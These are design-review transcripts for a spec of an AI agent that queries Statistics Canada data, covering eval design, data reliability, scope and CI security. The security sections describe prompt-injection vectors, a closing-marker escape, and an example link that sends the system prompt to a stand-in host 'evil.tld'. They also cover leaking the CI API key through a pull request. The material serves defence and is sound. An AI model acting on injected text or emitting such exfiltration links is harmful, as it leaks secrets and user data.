# Spec review transcripts (2026-10-26)

Two-round adversarial review of SPEC v0.1. Round 1: independent critiques. Round 2: cross-examination using chairman-verified live API facts.


---

## facts

# Chairman-verified facts (live StatCan WDS, 2026-10-26)

1. `getCubeMetadata` (POST) for 18-10-0004 works. Products dimension: 359 members, **19 top-level**.
2. **Rent exists** as member id 81, path: Shelter → Rented accommodation (80) → **Rent (81)**. A top-level-first 25-member card cap would NOT include "Rent", so the data critic's MAJOR #3 is confirmed.
3. Coordinate format confirmed: Ontario (14) + Rent (81) = `14.81.0.0.0.0.0.0.0.0` (10 positions, dimension order).
4. **An invalid coordinate does NOT return FAILED.** `getSeriesInfoFromCubePidCoord` with `99999.1.0…` returned `status: "SUCCESS"`, `responseStatusCode: 2`, `vectorId: 0`. The data critic's "FAILED" assumption is wrong; the server must check `responseStatusCode == 0` and `vectorId > 0`.
5. **`getSeriesInfoFromCubePidCoord` for the valid coordinate failed 4 of 4 attempts** (3× connection reset, 1× empty body). The data critic also saw resets on POSTs. The WDS POST endpoints are intermittently unreliable.
6. **`getDataFromCubePidCoordAndLatestNPeriods` worked first try**: it returned `vectorId 41691954` plus data in one call. This is a viable single-call fallback for `get_series`.
7. Real values for the v0.1 example: Ontario rent CPI 2025-09 = 161.2, 2026-09 = 164.4, **change = +2.0%** (v0.1's "4.1" was a placeholder). Points carry `decimals=1`, `scalarFactorCode=0`, `symbolCode=0`.
8. Valet values are strings (`"v": "1.4097"`), weekends are omitted (data critic, verified).
9. `subjectCode` is a list; `archived` is "1" (3,191) / "2" (5,088); 525 tables have null subject (data critic, verified).
10. StatCan limits: 25 req/s per IP, 50 req/s server-wide; 409 possible midnight–08:30 ET (official user guide).


---

## r1-eval

# R1 - Eval design review (staff ML eval engineer)

## BLOCKERS
**B1. "Replay" CI cannot replay.** The LLM runs live in CI, so the search queries, member choices and periods the agent sends differ from run to run. Cassettes keyed on the request will miss, and §10.7 says a miss "fails loudly", so CI will be red on most PRs. *Change §10.7:* drop request-level cassettes for data. Commit a **frozen data snapshot** instead: the full pinned-period series for every table the golden set touches, served by a `SnapshotBackend` that answers *any* coordinate. Commit a pg dump of the index with card embeddings. Query embeddings and rerank either use a CI `VOYAGE_API_KEY` (free tier) or fall back to FTS-only with a logged `degraded_retrieval` flag. Cassettes stay for tool unit tests only.

**B2. The gate is mostly noise.** 24 binary cases with a live, nondeterministic model: a 20/24 score has a 95% CI of about ±15 points, and "2 cases below baseline" (8 points) is within run-to-run variance. *Change §10.5:* run each case **k=3** (Haiku, about 3x cost, still cents). A case's score is its pass fraction. Fail the PR only on (a) a case that went from 3/3 to ≤1/3 (**flip rule**), or (b) mean pass rate down >10 points over all 60 cases. Store per-case rates in `baseline.json`, not just a total. Measure flakiness once (10 runs on main) and quarantine cases below 0.8 stability.

**B3. Gating on the test split leaks it.** Every PR shows the test score and failing test cases, so tuning *is* happening on test. *Change §10.2/§10.5:* the PR gate uses **dev only**. Test runs only at release tags or in the weekly job, and reports aggregates, never per-case output. Log every test-split run in `eval_run`; the README headline is the first run on each tag.

**B4. `answer_values` grading is circular.** The model labels its own numbers, so it can emit a correct value in the block while the prose says something else, or copy the label from the question. *Change §10.3:* (1) the prose must contain each `answer_values` number (regex, same tolerance); (2) each entry carries `{vector_id, ref_period}` for raw values, or `{op, operands:[refs]}` for derived ones; (3) the grader **recomputes** from that run's actual `get_series` outputs, *and* checks against the golden expected value. Labels come from a fixed enum (`level`, `change_abs`, `change_pct`, `ratio`).

## MAJOR
**M1. The citation check is too weak.** "Cites a URL returned in this run" passes when the model cites the right table with the wrong row. *Fix:* the citation must be a vector id plus a ref_period, and the point it names must equal the value it supports. That is B4(2).

**M2. The judge is validated on too few labels.** With 18/20, the lower 95% bound is about 68%. If most answers are faithful, a judge that always says "faithful" passes. *Change §10.4:* use 50 labels with ≥15 **seeded unfaithful** answers (swapped number, wrong period, uncited claim). Report Cohen's κ ≥0.7 and recall on unfaithful answers ≥0.8. Freeze the judge prompt before labelling.

**M3. Golden-set bias.** George knows the table titles, so his questions reuse title words and full-text search wins for free. *Fix:* ≥50% of questions paraphrased from The Daily or news headlines, with a lexical-overlap check against the card title (Jaccard <0.3). Commit the golden set in a PR that comes before any prompt tuning, so the git date proves the order.

**M4. Dev/test leakage through shared tables.** If `prices-007` (dev) and `prices-008` (test) hit the same table with the same template, test measures memorised tuning. *Fix:* stratify by category **and split by table group**: no table is expected in both splits.

**M5. Ambiguous and refusal grading is undefined or broken.** "Must not contain numbers" fails "no data for 2031". *Fix:* refusal = empty `answer_values` plus `refused: true` in the structured output. Ambiguous cases list `accepted_interpretations`, each with its own values, and the answer must state an assumption that matches one of them.

**M6. Injection gate with zero tolerance plus nondeterminism means flaky or meaningless.** *Fix:* with k=3 every attempt must pass (since injection is security, report the attack success rate). Grow to ≥20 variants generated from templates. 8 cases cannot support "safe".

## MINOR
- Per-category floors have no numbers. Set them explicitly in `evals/floors.toml`.
- Retrieval recall@5 has `expected.tables` "any of" lists, which inflates it. Report strict and lenient separately.
- The $0.50 cost gate uses an estimate. Gate on actual tokens after the run, and estimate before it.
- The Ragas faithfulness version is not pinned. Pin it, because scores shift between versions.
- §11 allowlist: say explicitly that `ai.mongodb.com` is the Voyage endpoint.
- Weekly drift: tag a case `drift` only when the snapshot value differs from the live value. Otherwise count it as a regression.

## WHAT'S GOOD (keep)
Pinned periods; a held-out split in principle; deterministic graders gate while the judge is advisory; injection as its own category; unanswerable and ambiguous categories; the budget guard; baseline changes as explicit commits; offline retrieval eval; per-run cost and latency.

## Open questions
1. **Arithmetic: add a `compute` tool.** It takes `{op, operands:[{vector_id, ref_period}]}` and resolves the operands from the same run's data, so derived numbers are verifiable and B4 becomes simple. Log any number the model computes outside the tool as a grader warning.
2. **60 cases: enough to demo, not enough to rank.** It is fine as a regression detector with k=3 and the flip rule. For the headline, report test pass rate **with a Wilson 95% CI** and the per-category n. Grow to about 100 cases (40 test) in v1.1 using templated variants.
3. **stdio is sufficient.** Add Streamable HTTP only if the demo needs a remote client; it is v2.


---

## r1-security

# R1 Security review: SPEC v0.1

## BLOCKERS
**B1. CI secret plus PR-controlled code.** §10.5 runs live Haiku on every PR with `ANTHROPIC_API_KEY`. Any PR can edit the runner, the budget guard or conftest. *Attack:* a PR changes the guard to print the key or to loop calls. With `pull_request_target`, a fork PR gets the key outright. *Change:* "Gate uses `on: pull_request` only, never `pull_request_target`. Fork PRs run offline jobs only (retrieval eval, unit tests, graders on recorded agent transcripts). The key is a dedicated Console workspace key with its own spend limit (e.g. $10). Workflow `permissions: contents: read, pull-requests: write`."

**B2. Injection "pass" is not judged mechanically, and the vectors are too narrow.** "No extra tool calls" and "no prompt leaked" have no definition. The fixtures cover only CKAN plus footnote. *Attack:* a payload in a member name (`get_table_dimensions`) or in card text (`search_tables`, which is also **embedded**, so it poisons retrieval rank too) goes untested. *Change:* "Each injection case declares `expected.max_tool_calls` and `expected.allowed_tools`. The system prompt contains a canary token, and leakage = canary or prompt substring in the output. Answer values are checked against the clean fixture. The 8 cases cover 4 vectors x 2 goals: CKAN description, footnote/card, member name, upstream error body x {wrong value/tool spam, exfil link/prompt leak}."

## MAJOR
**M1. A "marked field" alone is not a boundary.** *Attack:* the payload contains the closing marker (`</untrusted>`) and then fake instructions. *Change:* "Untrusted text is returned as a JSON string value (escaped) in field `untrusted_text`, never interpolated into prose. Control characters and marker-like tags are stripped, and text is length-capped. The server does this itself, because external MCP clients (Claude Code) never see our system prompt rule 4."

**M2. Exfiltration via citations/URLs.** The CKAN `url` and `resources` fields are attacker-controlled. *Attack:* a description makes the model output `[source](https://evil.tld/?q=<system prompt>)`, which the citation grader may accept. *Change:* "`source` URLs are built server-side from validated IDs (StatCan/Valet). CKAN links are only passed through if the host is `open.canada.ca`. The citation grader fails any URL whose host is not allowlisted. The CLI prints URLs as plain text, never auto-opens them."

**M3. SSRF / input validation.** The allowlist has no enforcement point. *Change:* "The allowlist is enforced in a custom httpx transport (re-checked on every redirect hop). Strict schema patterns: `product_id ^\d{8}$|^\d{2}-\d{2}-\d{4}$`, `series ^FX[A-Z]{6}$`, ISO dates, member ids integer. Query values go through httpx `params`, never f-strings." Also confirm that `ai.mongodb.com` is the actual Voyage endpoint.

**M4. Denial-of-wallet beyond call count.** 8 calls x an unbounded result size can still be costly, and the trailing-mean estimate is empty on the first run. *Change:* "Each tool result is capped at 4k tokens (truncated with a flag), `max_tokens` is set, and the per-run guard uses worst-case (cases x 8 calls x cap) until 10 runs exist. The guard reads the cap from protected config, not from CLI args."

**M5. Cassette/baseline tampering, plus leaked keys inside cassettes.** A PR can edit the cassettes, golden YAML and baseline together to "pass". VCR also records `Authorization`/`x-api-key` by default (Voyage). *Change:* "CODEOWNERS on `evals/`, `cassettes/`, `baseline.json`, `.github/`. The CI comment flags any diff touching them. vcr `filter_headers=['authorization','x-api-key']`, and gitleaks scans the cassettes."

**M6. Supply chain.** *Change:* "`uv.lock` committed, CI runs `uv sync --locked`. Actions pinned by commit SHA. Dependabot weekly. Docker images (postgres/pgvector) pinned by digest."

## MINOR
- **http_cache poisoning:** a poisoned upstream response persists for up to 24 h. Note it, add `make cache-clear`.
- **Logs:** §12 logs full args/results. State that headers and keys are never logged.
- **MCP:** the stdio server is first-party, so trust is fine. Add a snapshot test of the tool descriptions so a drive-by edit (description poisoning) shows up in review. Verify the stateless 2026-07-28 claims against the published spec before relying on them.
- **Refusal grader** "no numbers" breaks on years/table IDs. Use "no `answer_values`" instead.
- **Retries:** the backoff needs a max attempt count (3), or 429 loops eat the 60 s budget.

## OVERKILL (skip)
Signed/hashed cassette manifests, sandboxing the stdio server in a container, an LLM injection classifier, egress firewall in CI, OAuth for MCP (stdio only), and Streamable HTTP for the demo (it adds auth/DNS-rebinding surface for no gain).

## WHAT'S GOOD (keep)
Read-only tools, no code execution. Errors as tool results. Zero-tolerance injection gate. A missing cassette fails loudly. Baseline changes are explicit commits. Console spend cap plus the runner guard. Gitleaks. Third-party text is explicitly named untrusted in §8/§11.


---

## r1-data

# R1 data/reliability review of SPEC v0.1

Verification caveat: GET endpoints worked (getAllCubesListLite, CKAN, Valet). Every WDS POST (getCubeMetadata) failed with "Connection reset by peer" (curl exit 56) from this machine, repeatedly, so metadata/coordinate claims are marked UNVERIFIED. I did not spoof headers to get around it. Cube metadata is POST-only, so the indexer needs retries and a clear error path.

## BLOCKERS
1. CI cannot replay without an embedding store, and replay plus live Haiku contradict each other.
 - Problem: CI "needs only ANTHROPIC_API_KEY", never Voyage (§4), but search_tables needs card embeddings in Postgres plus a query embedding per question. Haiku is live, so tool arguments vary run to run; a strict cassette ("missing cassette fails loudly", §10.7) fails on benign argument changes. vcrpy's default matcher also ignores the POST body, so all WDS POSTs to one URL collide.
 - Change to §10.7: "CI loads a committed `fixtures/index.sql.zst` (cards + embeddings); Voyage query embeddings are cassetted per golden question. HTTP replay is a fixture store keyed on `(method, url, canonical-json body)` (`match_on=['method','uri','body']`). A miss returns tool error `CASSETTE_MISS`, counts as a case failure and is listed in the report, not a crash. Cassettes record every dimension member a case could validly use, so alternate valid agent paths replay."
2. get_series "one member per dimension" is under-specified and fails on sparse cubes (UNVERIFIED; documented WDS behaviour).
 - Problem: a coordinate is memberIds joined by dots, padded with `.0` to 10 positions (e.g. `2.2.0.0.0.0.0.0.0.0`), in `dimensionPositionId` order, not the order the model lists them. Invalid combinations come back HTTP 200 with a FAILED status object, not 404. Cubes with a statistics/data-type dimension add traps.
 - Change to §8 get_series: "`members` is `{dimensionPositionId: memberId}`. The server validates against cached metadata (all positions present, ids exist), builds the padded 10-position coordinate itself, and maps FAILED responses to `BAD_MEMBERS` with nearest valid alternatives. If the series is terminated, return points with `terminated: true`."

## MAJOR
3. The table card drops the member the headline example needs.
 - Problem: §7.2 caps members at 25, top-level first. "Rent" is a child of Shelter in 18-10-0004 (UNVERIFIED), so it would not be in the card or FTS text, yet the sample card prints "Rent". Whether "Rent" is a member of 18-10-0004 at all is unverified; if it is named differently ("Rented accommodation"), prices-007 is wrong.
 - Change: "`tsv` indexes ALL member names (weight B); the embedded card text shows only 25. Golden authoring step: confirm each expected member via getCubeMetadata and record its id in the case."
4. websearch_to_tsquery ANDs terms, so natural-language questions return near-zero FTS hits ("rise" is not in any card).
 - Change to §7.4: "Build the FTS query by OR-ing stemmed content terms (`to_tsquery('english','rent | ontario | …')`). Use exact cosine scan; HNSW is unnecessary at about 5k rows."
5. "Data cached until next 8:30 ET" is wrong.
 - Problem: tables do not release every business day; revisions land at release; 8:30 must be computed with `zoneinfo("America/Toronto")` across DST. The midnight-8:30 window is exactly when the cache could pin an error or stale body.
 - Change to §8: "Never cache non-200 or 409 responses. Data TTL = min(next 08:30 America/Toronto, 24h), cache key includes the request body. Metadata TTL 24h."
6. Point shape misses correctness fields.
 - Problem: values can be null with a status symbol (x, F, ..); `scalarFactorCode` (0 units, 3 thousands, 6 millions) and `decimals` change the stated number; `uom` is a code needing getCodeSets (CPI's unit is the index base).
 - Change: "Points carry `value|null`, `status_symbol`, `decimals`, `scalar_factor` (named), `uom_name`. Null is returned as SUPPRESSED, never coerced to 0; the refusal grader treats it as no data."
7. latest_n and the 24 limit.
 - Problem: the named endpoint is range-based; latest-N needs `getDataFromVectorsAndLatestNPeriods`. `latest_n` is relative to today, so goldens must not use it. 24 is fine for monthly YoY (needs 13) but too small for annual series.
 - Change: "Goldens use explicit start/end only. Cap by point count (max 120), not months."
8. §7.1 scoping, VERIFIED against getAllCubesListLite (8,279 cubes).
 - Evidence: `archived` is the string "1" (3,191) or "2" (5,088). A table ending 2011-01-01 has `archived:"1"`, so "1" = archived and `archived != "2"` is correct. BUT `subjectCode` is a LIST: length 0 for 525 tables (`null`), 2 for 5, 5 for 1, and it includes subtopic codes like `'3601'`, `'210202'`. CPI 18-10-0004 has `['18']`, Labour 14-10-0287 `['14']`, GDP 36-10-0434 `['36']`. The list gives codes only; names need getCodeSets.
 - Change: "Scope match = any element of `subjectCode` whose 2-digit prefix is allowlisted; the 525 empty-subject tables are excluded and logged. Store `subject_codes text[]`. scope.toml records names from getCodeSets."

## MINOR
- 409: error `UPSTREAM_LOCKED_409` includes `retry_after` (next 08:30 ET); indexer skips the window.
- Idempotent re-index: hash covers rendered card text plus embedding model name, or a model bump leaves stale vectors. Soft-delete cubes that become archived.
- §11 allowlist has `ai.mongodb.com`, not Voyage's api host; pick one and document it.
- Valet VERIFIED: values are strings (`"v": "1.4097"`) and weekends are omitted (a 10-17..10-25 query began at 10-19). Use Decimal; return `NO_OBSERVATION` for non-business days.
- CKAN VERIFIED: `package_search?q=rent` gave count 648; StatCan datasets carry `data_series_issue_identification` ("Tableau 46100092"). Descriptions are third-party text; keep the wrapping.
- Cap and wrap footnote text in cards (an injection vector).

## WHAT'S GOOD (keep)
- Table cards instead of full metadata; on-demand get_table_dimensions with filter.
- Errors as tool results with machine codes; read-only tools; strict schemas.
- Pinned reference periods; drift reported separately from regressions.
- dev/test split with test never used for tuning; zero-tolerance injection; judge validated on hand labels.
- Budget guard; metadata_hash idempotence; honest ts_rank_cd-is-not-BM25 note.


---

## r1-scope

# r1-scope review of SPEC v0.1

Verdict: not buildable in 4 weekends as written. Honest estimate is 8-9 weekends. The core story is strong; the surface area is not.

## BLOCKERS

**B1. Scope vs time.** 5 tools, hybrid RAG + rerank, 60 cases, two grader layers, injection suite, judge validation, weekly job, budget guard, cassettes. A finished small repo beats a half-built big one.
Change: v1.0 = M1-M4 plus injection cases and README. Move to v1.1: `search_datasets`, `get_fx_rate` (keep 3 tools: search_tables, get_table_dimensions, get_series), F7 LLM judge and the 20 hand-labels, weekly live job, month-to-date budget guard (keep a per-run cost cap only). Golden set 40 cases (24 dev / 16 test), injection 6. Drop Ragas.

**B2. Claim 3 is not provable as written.** 16 test cases means one case is ~6 points, so a "2 case" tolerance is a third of the split. §10.7 cassettes cover data APIs and Voyage, but the Claude call is live in CI, so CI is nondeterministic and costs money per PR. Also the gate runs the test split on every PR, which makes it a tuning signal and contradicts "never used for tuning".
Change: gate on deterministic checks (retrieval recall@5/MRR on all cases, tool-schema snapshot test, injection fixtures) plus a Haiku run at temperature 0 with an explicit flake tolerance. Compute and publish the test-split score only at release tags. M4 proof must be a linked, real failing PR (broken tool description) in the README. Add a short "what the gate can and cannot detect" table.

**B3. Claim 4 is asserted, not shown.** Retries and rate limiters are invisible plumbing; 6-8 injection cases with "zero tolerance" is a smoke test.
Change: reword to "I test AI features adversarially and track cost and latency". README gets a claims-to-evidence table linking each claim to one file, PR or CI run, plus a "limits of this injection suite" paragraph.

## MAJOR

**M1. "Did he build this?" risk.** Python is his secondary language and the stack is exotic (mcp 2.x stateless, `strict`, `fallbacks`, tool runner, HNSW, RRF, Ragas, vcrpy).
Change: add §13.3 Ownership rules. Hand-write RRF, the token-bucket limiter and the graders. One ADR per decision in `docs/adr/` (pgvector, table cards, RRF, replay design, no LangChain, Voyage). Small PRs with self-written descriptions; keep the failed attempts in history. Rule: he must be able to whiteboard every file.

**M2. Missing artifacts.** No eval-history chart, no failure analysis.
Change: M4 proof adds committed `evals/history.jsonl` and a generated chart in the README. Add `docs/FINDINGS.md`: 3 real failures the evals caught (wrong table, guessed member id) with before/after scores. This is the most persuasive item in the repo; make it a deliverable.

**M3. Demo and try-it-yourself.** Recording has no owner. Reviewer would need a Voyage key and a full index.
Change: GIF and `--trace` output in M3; commit a small index seed (`make seed`) so the repo runs with only `ANTHROPIC_API_KEY`; add a `claude mcp add` quickstart.

**M4. Retrieval complexity unjustified.** Change: M1 ships vector-only recall@5, M2 adds FTS+RRF, rerank only if it measurably helps. Put the three numbers in the README as an ablation table.

**M5. Unverified fast-moving stack.** mcp 2.x spec date, model IDs, `fallbacks`, tool runner. Change: M1 day one verifies each against current docs; keep a thin adapter. Close the open "compute tool" question: no, grade arithmetic independently.

## MINOR
- Allowlist lists `ai.mongodb.com`; confirm the real Voyage host and comment why it is there.
- "Ambiguous" category has no grading rubric in §10.3; define one or drop it in v1.
- Drop Ollama from v2 priority; it distracts from the four claims.
- `eval_run`/`eval_result` Postgres tables duplicate committed history; use JSONL files in v1.
- State how many golden values were hand-checked against the StatCan site.

## Interview questions invited vs prepared
1. Why this retrieval design, show the ablation (fixed by M4).
2. How do you know the eval is not overfit to your own questions (B2).
3. Walk me through a failure the evals caught (M2).
4. What does RRF's 60 do; why 25 members per card (M1).
5. How does injection reach the model via tool results; what did your suite miss (B3).
6. Why replay cassettes if the LLM is live (B2).
7. What changes at 8,000 tables or with French? Add a one-page scaling ADR.

## Realistic timeline
| M | Honest estimate |
|---|---|
| M1 indexer, cards, embeddings, recall@5 | 1.5 weekends |
| M2 hybrid search, MCP (3 tools), cache, limiter | 1.5 weekends (5 tools: 2.5) |
| M3 agent CLI, citations, answer_values, demo | 1 weekend |
| M4 40 cases, graders, replay, gate, reports | 2 weekends |
| M5 as spec (judge, weekly, budget, full README) | 2 weekends |
Spec total 8-9 weekends. Trimmed v1.0 (M1-M4 + 6 injection + README/FINDINGS/chart): 6 weekends. To hit 4: M1-M3 plus a 30-case eval with a retrieval-only gate, tag v0.9 and call it "v1.0 at ~6".

## WHAT'S GOOD (keep)
- Live public data with clickable citations: checkable in ten minutes.
- Dev/test split, pinned reference periods, drift reported apart from regressions.
- Table cards instead of embedding raw metadata: real insight, great interview material.
- Unanswerable, ambiguous and injection categories; deterministic graders gate, judge advisory.
- Non-goals list, no LangChain, thin MCP layer over plain functions.
- Cost reporting, explicit baseline commits, PR-per-slice workflow with eval delta comments.


---

## r2-eval

# R2 - Eval scientist (round 2)

## 1. CHALLENGE
- **Scope B2: "Haiku run at temperature 0 with an explicit flake tolerance."** Temperature 0 is not deterministic for Claude; k=1 plus a tolerance just loosens the threshold. Keep a small k and the flip rule instead.
- **Scope M5: "close the compute tool question: no, grade arithmetic independently."** "Independently" from what? Unless each number is tied to `{vector_id, ref_period}`, the grader cannot tell a right number that happens to match from a right number derived from the right row. I will give up the tool, but not the operand refs (see Concede 3).
- **Data B1: "Voyage query embeddings are cassetted per golden question… cassettes record every dimension member a case could validly use."** Recording "every valid path" is open-ended authoring work, and it still misses when Haiku rephrases a search. A frozen per-table snapshot backend that answers any coordinate is less work and never misses. Agree on the committed index dump.
- **Security B2: 8 injection cases as "4 vectors x 2 goals"** is good coverage design, but scope cuts injection to 6. Keep the 4 vectors; 1 goal each plus 2 exfil = 6. Do not drop the member-name vector.
- **Security M5 CODEOWNERS** is theatre on a solo repo. George owns everything. Keep the CI diff flag and the vcr header filter; drop CODEOWNERS.
- **Scope "drop ambiguous in v1"**: agree. Defining its rubric (my M5) costs more than it teaches.

## 2. CONCEDE (shrunk to fit 6 weekends)
1. **k=3 on every PR -> k=3 on dev only, 24 cases.** With Haiku that is about 72 runs, still cents. Flakiness study: 5 runs on main once, not 10.
2. **Judge with 50 labels and κ -> v1.1 entirely**. v1.0 states "no LLM judge".
3. **`compute` tool + enum-labelled operands -> operands only.** Each `answer_values` entry carries `{vector_id, ref_period}`, or `{op, operand_refs}` for derived values. The grader recomputes with plain Python. The prose-contains-number regex stays (10 lines).
4. **Golden set 60 -> 40 (24 dev / 16 test)**, split by table group. Paraphrase rule shrinks to ">=1/3 phrased from The Daily headlines"; overlap check is a warning, not a gate.
5. **Wilson CI and per-category floors -> one line in the README**: test pass rate with Wilson 95% CI and n. No floors.toml.
6. **Injection >=20 variants -> 6 cases at k=3**, report attack success rate, plus a "limits" paragraph.

## 3. MUST-FIX (ranked)
1. **v1.0**: Replace request cassettes with a committed index dump plus a frozen per-table data snapshot backend; misses return `CASSETTE_MISS` as a case failure (eval B1 + data B1).
2. **v1.0**: PR gate runs dev only; test split runs only at release tags and reports aggregates with Wilson CI (eval B3 + scope B2).
3. **v1.0**: Gate = k=3 per dev case, fail on a 3/3 -> <=1/3 flip or a mean drop >10 points; store per-case rates in baseline.json (eval B2).
4. **v1.0**: `answer_values` carry `{vector_id, ref_period}` refs; grader recomputes from the run's data and checks prose contains each number; refusal = `refused: true` and empty values (eval B4/M5, security minor).
5. **v1.0**: `get_series` builds the 10-position coordinate server-side, treats `responseStatusCode != 0` or `vectorId == 0` as `BAD_MEMBERS`, uses `getDataFromCubePidCoordAndLatestNPeriods` as fallback, and returns null/status/scalar fields (facts 3-6, data B2/M6).
6. **v1.0**: Index all member names in `tsv` and record member ids in each golden case, fixing the "Rent" gap; correct the example value to +2.0% (facts 2, 7).
7. **v1.0**: CI uses `on: pull_request` only, fork PRs run offline, and a dedicated spend-capped key; untrusted text goes in an escaped `untrusted_text` field; 6 injection cases with a canary and max_tool_calls (security B1/B2/M1).
8. **v1.1**: LLM judge (50 labels, seeded unfaithful, κ>=0.7), weekly live drift job, growth to about 100 cases, and the full 4x2 injection matrix.


---

## r2-security

# R2 Security red-team (6-weekend budget)

## 1. CHALLENGE
- **Eval B1, "use a CI `VOYAGE_API_KEY`".** This adds a second secret to PR-controlled code. Use the data critic's design instead: "Voyage query embeddings are cassetted per golden question", plus the committed index. Then CI needs no Voyage key.
- **Eval B2, "k=3".** This triples spend, and the runner is PR-editable. It is safe only with a dedicated key that has a Console spend limit and with fork PRs running offline jobs only. Run k=3 on dev only.
- **Eval M6, "≥20 variants".** Overkill for v1.0. Templated variants add count, not coverage. What matters is the vector x goal matrix.
- **Scope B1, cutting `search_datasets` and `get_fx_rate`.** A security win: it removes CKAN, the main untrusted-text and SSRF vector, and it removes Valet. But "injection 6" must then cover the *remaining* vectors: card/footnote, member names, and the error body, each x {wrong value or tool spam, exfil or prompt leak}.
- **Scope B1, "per-run cost cap only".** The runner cap is PR-editable, so it is acceptable only alongside the Console spend limit.
- **Scope B2, "temperature 0".** This does not make Claude deterministic and must not replace the flip rule.
- **Data #3, "ALL member names", and data #2, "nearest valid alternatives".** Both put more third-party text into rank and into tool results. Keep them, but length-cap the names and return them only as escaped untrusted text.
- **Data #5, "never cache non-200".** Agreed. It closes my cache-poisoning point.

## 2. CONCEDE
- **M5:** CODEOWNERS is pointless on a solo repo. Minimum: VCR `filter_headers`, gitleaks on fixtures, and a CI comment that flags diffs to `evals/`, `fixtures/` and `baseline.json`.
- **M6:** `uv sync --locked` plus actions pinned by SHA. Dependabot and image digests move to v1.1.
- **M4:** drop the worst-case guard maths. Keep a 4k tool-result cap, `max_tokens` and the spend limit.
- **B2:** 8 cases become 6 (3x2), still judged mechanically (`allowed_tools`/`max_tool_calls`, a canary token).
- **M3:** a single httpx event hook checks the host on every request, redirects included, plus the schema patterns. No custom transport.
- **M2:** with CKAN gone, URLs are built server-side. The grader fails any non-allowlisted host.
- **MINORs:** keep the retry cap (3) and the tool-description snapshot. The rest moves to v1.1.

## 3. MUST-FIX (ranked)
1. **v1.0:** CI runs `on: pull_request` only. Fork PRs run offline jobs. A dedicated Anthropic key with a spend limit. No Voyage key in CI.
2. **v1.0:** A snapshot/fixture backend replaces request-matched cassettes. A miss counts as a `CASSETTE_MISS` case failure, not a crash.
3. **v1.0:** The PR gate runs dev only, k=3, with the flip rule. Test runs only at tags and reports aggregates only.
4. **v1.0:** `get_series` builds the coordinate server-side and is valid only if `responseStatusCode==0` and `vectorId>0`. It falls back to `getDataFromCubePidCoordAndLatestNPeriods`. Retries capped at 3. Never cache non-200.
5. **v1.0:** Untrusted text goes out as an escaped, length-capped `untrusted_text` field. URLs are built server-side. The host allowlist is enforced in an httpx hook.
6. **v1.0:** 6 injection cases (3 vectors x 2 goals), judged mechanically. The README has a "limits of this suite" paragraph.
7. **v1.0:** `answer_values` carry `{vector_id, ref_period}`, and the prose must contain each value. Refusal is `refused: true`. FTS indexes all members (Rent, id 81).
8. **v1.0:** Hygiene: `filter_headers`, gitleaks, `uv sync --locked`, SHA-pinned actions, a result cap with `max_tokens`, and a tool-description snapshot. **v1.1:** Dependabot, image digests, ≥20 variants, the month-to-date guard, and CKAN/FX (with the full M2/M3 controls).


---

## r2-data

# R2 Data/Reliability (final)

## 1. CHALLENGE
**Replay design: pick SnapshotBackend (eval B1), not keyed cassettes. I withdraw "index dump + keyed cassettes" for data.**
Why: the agent is live, so it may request any coordinate or period. Keyed cassettes miss on benign variation, and my "record every member a case could validly use" is unbounded work. The facts make it worse: WDS POSTs are flaky (4/4 failures), so recording cassettes is itself a flaky chore. A snapshot is built once, offline, with retries. Refinement: do not snapshot "any coordinate". Snapshot per golden table: cached `getCubeMetadata` plus the full pinned-window series for every coordinate the case could use. A coordinate with no snapshot returns the same error shape as live (`responseStatusCode 2 / vectorId 0` mapped to `BAD_MEMBERS`). The index ships as one committed `index.sql.zst`. The query embedding is the weak spot. Choose: CI Voyage key if the free tier allows it, otherwise precompute embeddings of the golden questions and run FTS-only for novel queries, flagged `degraded_retrieval`. Keep vcr only for unit tests of the HTTP client.

Where I disagree with others:
- Eval B4 / "add a `compute` tool", `{op, operands:[refs]}` grading: overkill for 6 weekends, and scope M5 already says no. Keep: prose must contain the `answer_values` numbers, plus a citation of `{vector_id, ref_period}` checked against the run's actual `get_series` output. Drop the recompute graph.
- Eval B2 "k=3 on 60 cases": 3x spend and runtime, and it conflicts with scope's 40 cases. Use k=3 on dev only, run the test split at release tags (this resolves the eval B3 / scope B2 conflict).
- Security "only pass `product_id ^\d{8}$|^\d{2}-\d{2}-\d{4}$`": fine. But the custom httpx transport that re-checks redirects is v1.1; for v1.0 a hardcoded base-URL map plus schema patterns is enough.
- Security OVERKILL list: agree. M5 CODEOWNERS and M6 SHA pinning: v1.1, except `uv.lock` and `on: pull_request`.
- Scope "drop `get_fx_rate`/`search_datasets`": agree, and I drop my Valet and CKAN items with them (decimals, `NO_OBSERVATION`, snippet wrapping).
- Scope M5 "close compute": agree.

## 2. CONCEDE / CORRECT
- My R1 B2 (FAILED mapping): corrected. The server checks `responseStatusCode == 0 and vectorId > 0`, and maps anything else to `BAD_MEMBERS`. The rest of the fix stands: validate against cached metadata before calling, and build the padded 10-position coordinate server-side.
- R1 M3 (Rent missing from the card) is confirmed: id 81 is under Shelter. Index ALL member names in `tsv` (weight B), and cap only the embedded text.
- NEW from facts 5-6: make `getDataFromCubePidCoordAndLatestNPeriods` the primary `get_series` call, since it returns `vectorId` and data in one call. Use `getSeriesInfoFromCubePidCoord` only if a vectorId is needed alone. Retries: 3 attempts, jittered backoff, and treat connection reset and empty body as retryable. After the last attempt, return `UPSTREAM_UNAVAILABLE`. Note the "latest N" call is relative to now, so goldens against the live API drift. This is fine for the weekly job, and the snapshot freezes it for CI.
- Fact 7: the v0.1 example answer is +2.0% (161.2 to 164.4), not 4.1. Fix the example and the golden file.
- R1 B1 index dump: kept, now as the snapshot design.
- Drop for 6 weekends: R1 #7 (latest_n cap by points, just default to explicit start/end and cap at 120), the Valet `Decimal` and weekend point, the CKAN point, the metadata_hash with model name (one line only), soft-delete archived tables, the 409 `retry_after` field (just never cache non-200 or 409).
- Shrink R1 #5: TTL = a flat 24h for metadata and 6h for data, not computed 08:30 ET logic. Never cache errors.
- Shrink R1 #6: keep `value|null`, `decimals`, `scalar_factor`, `status_symbol`. Drop the `uom_name` lookup via getCodeSets.
- R1 #4 stays (OR-ing FTS terms), because it decides whether hybrid retrieval works at all. It is cheap.

## 3. MUST-FIX LIST (ranked)
1. **v1.0** Replace the cassette replay with committed per-table snapshots plus `index.sql.zst`, a SnapshotBackend that returns live-shaped errors, and a defined embedding fallback (§10.7).
2. **v1.0** The gate runs on dev only, with k=3 plus a flip rule. The test split runs at tags. Add a CI workflow with `on: pull_request`, a capped-spend key, and offline jobs for forks (eval B2/B3, sec B1).
3. **v1.0** Cut scope to 3 tools (`search_tables`, `get_table_dimensions`, `get_series`), 40 cases, 6 injection cases. Drop the judge, weekly job, budget guard, and Postgres eval tables (scope B1).
